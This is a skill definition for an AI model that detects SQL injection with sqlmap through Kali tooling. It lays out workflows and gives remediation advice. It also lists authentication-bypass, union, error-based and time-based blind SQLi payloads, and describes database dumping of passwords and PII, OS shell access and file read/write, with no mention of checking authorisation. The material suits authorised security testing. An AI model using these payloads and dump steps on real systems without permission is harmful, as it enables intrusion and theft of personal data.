---
name: Detecting SQL Injection Vulnerabilities
description: |
  This skill enables Claude to detect SQL injection vulnerabilities in code and live applications using advanced testing. It uses the sql-injection-detector plugin combined with Kali Linux MCP tools (sqlmap) to analyze codebases, test live endpoints, identify potential SQL injection flaws, and provide exploitation proof-of-concepts with remediation guidance. Use this skill when the user asks to find SQL injection vulnerabilities, test for SQLi, scan for SQL injection, run sqlmap, or check code for database injection risks. The skill is triggered by phrases like "detect SQL injection", "scan for SQLi", "test for SQL injection", "run sqlmap", or "check for SQL injection vulnerabilities".
---

## Overview

This skill empowers Claude to proactively identify and address SQL injection vulnerabilities within codebases and live applications. By leveraging the sql-injection-detector plugin combined with **Kali Linux MCP tools (sqlmap)**, Claude can perform comprehensive static and dynamic SQL injection testing, pinpoint potential security flaws, demonstrate exploitability, and offer actionable recommendations to mitigate risks. This ensures more secure and robust applications.

## How It Works

1. **Initiate Scan**: Upon receiving a relevant request, Claude activates the sql-injection-detector plugin.
2. **Static Code Analysis**: The plugin analyzes the codebase, examining code patterns, input vectors, and query contexts.
3. **Dynamic Testing**: Uses Kali MCP tools (`sql_injection_test`) to test live endpoints with sqlmap.
4. **Vulnerability Identification**: The plugin identifies potential SQL injection vulnerabilities, categorizing them by severity.
5. **Exploitation PoC**: Demonstrates exploitability with real injection payloads and database access proof.
6. **Report Generation**: A detailed report is generated, outlining the identified vulnerabilities, their locations, exploitation techniques, and recommended remediation steps.

## When to Use This Skill

This skill activates when you need to:
- Audit a codebase for SQL injection vulnerabilities (SAST).
- Test live endpoints for SQL injection (DAST with sqlmap).
- Secure a web application against SQL injection attacks.
- Review code changes for potential SQL injection risks.
- Demonstrate exploitability with proof-of-concept.
- Understand how SQL injection vulnerabilities occur and how to prevent them.

## Examples

### Example 1: Comprehensive SQL Injection Testing

User request: "Test https://example.com/login for SQL injection vulnerabilities"

The skill will:
1. **Static Analysis** - Scan codebase for vulnerable SQL query patterns
2. **Dynamic Testing** - Use `mcp__kali-server__sql_injection_test` with sqlmap on login endpoint
3. **Database Detection** - Identify database type (MySQL, PostgreSQL, MSSQL, etc.)
4. **Exploitation PoC** - Demonstrate data extraction or authentication bypass
5. **Remediation Guidance** - Provide parameterized query examples and input validation

**Kali MCP Tools Used:**
- `sql_injection_test`: Automated SQL injection with sqlmap (--batch, --dbs, --tables, --dump)
- `curl_request`: Manual injection payload testing and verification

### Example 2: Securing a Web Application

User request: "Scan my web application for SQL injection vulnerabilities."

The skill will:
1. **Code Analysis** - Scan codebase for dynamic SQL query construction
2. **Identify Injection Points** - Find user input that flows into SQL queries
3. **Live Testing** - Use `mcp__kali-server__sql_injection_test` on identified endpoints
4. **Severity Classification** - Rate vulnerabilities by exploitability and impact
5. Generate a report detailing any identified vulnerabilities, their severity, and remediation recommendations

**Kali MCP Tools Used:**
- `sql_injection_test`: Full sqlmap testing suite
- `execute_command`: Custom SQL injection payloads

### Example 3: Reviewing Code Changes

User request: "Check these code changes for potential SQL injection risks."

The skill will:
1. Activate the sql-injection-detector plugin
2. Analyze the provided code changes for potential SQL injection vulnerabilities
3. Identify unsafe patterns (string concatenation, unvalidated input)
4. Provide feedback on the security implications of the changes and suggest improvements
5. If deployed: test with `mcp__kali-server__sql_injection_test` to validate

### Example 4: Advanced SQLi Exploitation

User request: "Test the /api/search?q= parameter for SQL injection and extract database contents"

The skill will:
1. **Initial Detection** - Use `mcp__kali-server__sql_injection_test` for vulnerability confirmation
2. **Database Enumeration** - Extract database names with `--dbs` flag
3. **Table Discovery** - Enumerate tables with `--tables -D database_name`
4. **Data Extraction** - Dump sensitive data with `--dump -T users -D webapp`
5. **Post-Exploitation** - Attempt privilege escalation and OS command execution
6. **Full Report** - Document complete attack chain with remediation steps

**Kali MCP Tools Used:**
- `sql_injection_test`: Advanced sqlmap with tamper scripts, level 5, risk 3
- `curl_request`: Verify extraction manually

## Kali MCP Integration

This skill leverages **sqlmap** via the Kali MCP server for powerful SQL injection testing:

```bash
# Install Kali MCP plugin
/plugin install kali-mcp@stoked-automations

# Verify sqlmap is available
/mcp list | grep kali-server
```

### SQLMap Testing Levels

| Level | Description | Use Case |
|-------|-------------|----------|
| **Level 1** | Basic tests (default) | Quick vulnerability check |
| **Level 2** | Extended cookie testing | Session-based SQLi |
| **Level 3** | User-Agent and Referer | Header injection testing |
| **Level 4** | Complex payloads | Advanced obfuscation |
| **Level 5** | Exhaustive testing | Maximum coverage |

### SQL Injection Testing Workflow

```
1. Reconnaissance Phase
   └─ mcp__kali-server__curl_request (endpoint analysis)
   └─ Identify injection points (GET/POST params, cookies, headers)

2. Detection Phase
   └─ mcp__kali-server__sql_injection_test --batch --level=1
   └─ Confirm vulnerability and database type

3. Enumeration Phase
   └─ mcp__kali-server__sql_injection_test --dbs (list databases)
   └─ mcp__kali-server__sql_injection_test --tables -D <db>
   └─ mcp__kali-server__sql_injection_test --columns -T <table> -D <db>

4. Exploitation Phase
   └─ mcp__kali-server__sql_injection_test --dump -T <table> -D <db>
   └─ Extract sensitive data (passwords, PII, etc.)

5. Advanced Testing Phase
   └─ OS command execution (--os-shell)
   └─ File system access (--file-read, --file-write)
   └─ Out-of-band data exfiltration

6. Remediation Phase
   └─ Document findings with atlassian-mcp (Jira tickets)
   └─ Provide code fixes (parameterized queries)
```

### Common SQLi Payloads

The skill can test various SQL injection techniques:

**Authentication Bypass:**
```sql
' OR '1'='1' --
' OR '1'='1' /*
admin' --
' OR 1=1--
```

**Union-Based SQLi:**
```sql
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT version(), database(), user()--
```

**Error-Based SQLi:**
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Time-Based Blind SQLi:**
```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '00:00:05'--
```

**Boolean-Based Blind SQLi:**
```sql
' AND '1'='1
' AND '1'='2
```

## Best Practices

- **Input Validation**: Always validate and sanitize user inputs to prevent malicious data from entering the system.
- **Parameterized Queries**: Utilize parameterized queries or prepared statements to prevent SQL injection attacks.
- **Least Privilege**: Grant database users only the necessary privileges to minimize the impact of a potential SQL injection attack.
- **Web Application Firewall**: Deploy WAF rules to detect and block SQL injection attempts.
- **Regular Testing**: Run sqlmap testing regularly, especially after code changes.
- **Rate Limiting**: Protect against brute-force SQLi attempts with rate limiting.

## Integration with Other Plugins

- **atlassian-mcp**: Create Jira tickets for each SQL injection finding with full exploitation details
- **gitlab-mcp**: Create merge requests with parameterized query fixes
- **serena**: Store SQL injection test results and track remediation over time
- **penetration-tester**: Comprehensive penetration testing including SQL injection
- **vulnerability-scanner**: Combine SAST and DAST for complete coverage

### Example: SQL Injection Remediation Workflow

```
1. Detect SQLi with mcp__kali-server__sql_injection_test
2. Extract exploitation proof-of-concept
3. Create Jira ticket with atlassian-mcp:
   - Title: "SQL Injection in /api/login endpoint"
   - Severity: Critical
   - Description: Full sqlmap output and PoC
   - Remediation: Parameterized query code example
4. Developer fixes code (parameterized queries)
5. Create merge request with gitlab-mcp
6. Re-test with sqlmap to verify fix
7. Close Jira ticket when confirmed fixed
8. Store case study with serena for training
```